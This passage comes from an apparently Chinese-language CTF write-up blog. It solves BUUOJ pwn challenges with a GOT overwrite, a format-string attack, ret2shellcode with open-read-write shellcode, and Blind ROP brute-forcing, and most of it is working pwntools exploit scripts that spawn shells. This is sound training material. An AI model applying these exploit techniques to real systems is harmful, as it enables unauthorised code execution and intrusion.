&amp;itemlist0_ptr -0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment">#覆盖的itemlist[0]-&gt;ptr 为atoi_got</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>上面exp写的很详细了。</p><blockquote><p>  <a href="https://www.cnblogs.com/Rookle/p/12942229.html">https://www.cnblogs.com/Rookle/p/12942229.html</a></p></blockquote><h1 id="0x52-inndy-echo-fmt-str"><a href="#0x52-inndy-echo-fmt-str" class="headerlink" title="0x52.inndy_echo(fmt_str)"></a>0x52.inndy_echo(fmt_str)</h1><p>很明显的格式化字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./<span class="built_in">echo</span> </span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p </span><br><span class="line">aaaa 0x100 0xf7f695a0 (nil) 0xf7faf000 0x80482e7 0xf63d4e2e 0x61616161 0x20702520 0x25207025</span><br></pre></td></tr></table></figure><p>第七个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&quot;./echo&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29402</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x53-极客大挑战-2019-Not-Bad-ret2shellcode"><a href="#0x53-极客大挑战-2019-Not-Bad-ret2shellcode" class="headerlink" title="0x53.[极客大挑战 2019]Not Bad(ret2shellcode)"></a>0x53.[极客大挑战 2019]Not Bad(ret2shellcode)</h1><p>有0x18的溢出，buf只有0x20大小不够写栈迁移的rop。</p><p>程序在一开始：<code>mmap(0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><p>所以接下来：在这里写shellcode，跳过来执行</p><p>查看系统调用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ seccomp-tools dump ./bad</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">orw_payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)           <span class="comment">#打开根目录下的flag文件</span></span><br><span class="line">orw_payload+=shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)       <span class="comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_payload+=shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#将mmap地址上的内容输出0x50个字节</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./bad&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26570</span>)</span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">jmp_rsp=<span class="number">0x400a01</span></span><br><span class="line"></span><br><span class="line">payload1=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="number">3</span>,mmap+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,mmap+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">payload=asm(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中<code>p64(jmp_rsp)+asm(&quot;sub rsp,0x30; jmp rsp&quot;)</code>，首先将rip指到栈上，然后后面写的jmp将rip指到我们写的shellcode上</p><h1 id="0x54-axb-2019-brop64（BROP）"><a href="#0x54-axb-2019-brop64（BROP）" class="headerlink" title="0x54.axb_2019_brop64（BROP）"></a>0x54.axb_2019_brop64（BROP）</h1><p>虽然给了elf，但这题其实是brop的题</p><h2 id="解法一：ret2libc"><a href="#解法一：ret2libc" class="headerlink" title="解法一：ret2libc"></a>解法一：ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./axb_2019_brop64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29353</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">8</span>) + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh =  base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">8</span>) + p64(pop_rdi_ret) +p64(bin_sh)+p64(sys_addr)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="解法二：brop"><a href="#解法二：brop" class="headerlink" title="解法二：brop"></a>解法二：brop</h2><blockquote><p>  <a href="https://www.anquanke.com/post/id/196722">https://www.anquanke.com/post/id/196722</a></p><p>  <a href="https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html">https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html</a></p><p>  <a href="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/">http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/</a></p></blockquote><p>输入%s%p等测试发现不是fmtstr的洞：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ cyclic 400</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span><br><span class="line">gwt@ubuntu:~/Desktop$ ./axb_2019_brop64 </span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I<span class="string">&#x27;ll answer whatever you say!</span></span><br><span class="line"><span class="string">Please tell me:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span></span><br><span class="line"><span class="string">Repeater:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span></span><br><span class="line"><span class="string">@Segmentation fault (core dumped)</span></span><br></pre></td></tr></table></figure><p>存在溢出</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> <span class="number">0</span>:</span><br><span class="line">    padding_length=Force_find_padding()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.............</span><br><span class="line">[+] Receiving all data: Done (237B)</span><br><span class="line">[*] Process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 23755)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./axb_2019_brop64&#x27;</span>: pid 23758</span><br><span class="line">[+] Receiving all data: Done (228B)</span><br><span class="line">[*] Process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 23758)</span><br><span class="line">[+] The <span class="literal">true</span> padding length is 216</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><h3 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找<code>stop gadget</code></h3><p>此处我们希望我们能够爆破出main函数的首地址，进而直接让程序回到main函数进行执行。首先此处我们可以先泄露原来的返回地址，进而缩小爆破范围。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">old_return_addr=null</span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"><span class="comment"># [*] The old return address is 0x400834</span></span><br></pre></td></tr></table></figure><p>接下来爆破脚本(0x0000-0xffff)：</p><p>这里已经知道结果所以为了方便从0x7d0开始搞的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x07d0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">Find_stop_gadget(old_return_addr,padding_length)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./axb_2019_brop64&#x27;</span>: pid 32243</span><br><span class="line">[+] Receiving all data: Done (400B)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> (pid 32243)</span><br><span class="line">[+] We found a stop gadget is 0x4007d6</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><h3 id="寻找BROP-gadget"><a href="#寻找BROP-gadget" class="headerlink" title="寻找BROP gadget"></a>寻找<code>BROP gadget</code></h3><p>根据<code>__libc_csu_init</code>，利用的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">payload += p64(libc_csu_init_address) </span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br></pre></td></tr></table></figure><p>如果<code>libc_csu_init_address</code>是pop rbx，那么程序会从stop_gadget重新执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">brop_gadget=Find_brop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget)</span><br><span class="line"><span class="comment">#0x40095A</span></span><br></pre></td></tr></table></figure><h3 id="寻找puts-plt"><a href="#寻找puts-plt" class="headerlink" title="寻找puts@plt"></a>寻找puts@plt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">func_plt=Find_func_plt(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget,brop_gadget)</span><br><span class="line"><span class="comment"># func_plt=0x400635</span></span><br></pre></td></tr></table></figure><h3 id="利用puts-plt，Dump源文件"><a href="#利用puts-plt，Dump源文件" class="headerlink" title="利用puts@plt，Dump源文件"></a>利用puts@plt，Dump源文件</h3><p>我dump不出来。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span 